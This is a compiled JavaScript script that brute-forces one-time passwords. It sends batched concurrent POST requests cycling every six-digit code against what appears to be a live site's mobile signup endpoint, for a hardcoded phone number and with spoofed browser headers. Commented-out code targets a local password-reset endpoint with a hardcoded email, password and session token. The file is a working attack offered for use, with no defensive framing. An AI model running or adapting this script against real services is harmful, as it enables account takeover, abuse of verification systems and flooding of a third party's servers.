"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        // let data = JSON.stringify({
        //     "email": "sangam@gmail.com",
        //     "otp": otp,
        //     "newPassword": "sangam"
        // });
        // let config = {
        //     method: 'post',
        //     maxBodyLength: Infinity,
        //     url: 'http://localhost:3000/reset-password',
        //     headers: {
        //         'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzMyNDU0MDkzfQ.P7QBI7a0jMZJphqTryvWDGgGTna03kHA3fKS33TvQ5M',
        //         'Content-Type': 'application/json'
        //     },
        //     data: data
        // };
        let data = JSON.stringify({
            "mobile": "9370645756",
            "name": "",
            "otp": otp,
            "crmLeadId": null,
            "sourceName": "web app",
            "isWhatsappNo": false,
            "whatsapp": "",
            "isWhatsAppVerified": false
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://neevay.com/api/auth/signup/mobile',
            headers: {
                'Content-Type': 'application/json',
                'accept-language': 'en,en-IN;q=0.9,mr;q=0.8,hi;q=0.7,fr;q=0.6',
                'content-type': 'application/json',
                'origin': 'https://www.neevay.com',
                'priority': 'u=1, i',
                'referer': 'https://www.neevay.com/',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (error) {
            // console.log(error)
        }
    });
}
// doing bruetforce for otp
// for (let i = 0; i <= 999999; i += 100) {
//         (sendRequest((i).toString()))
// }
//batching request 100 at a time
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 999999; i += 100) {
            const p = [];
            console.log(i);
            for (let j = 0; j <= 100; j++) {
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p);
        }
    });
}
main();
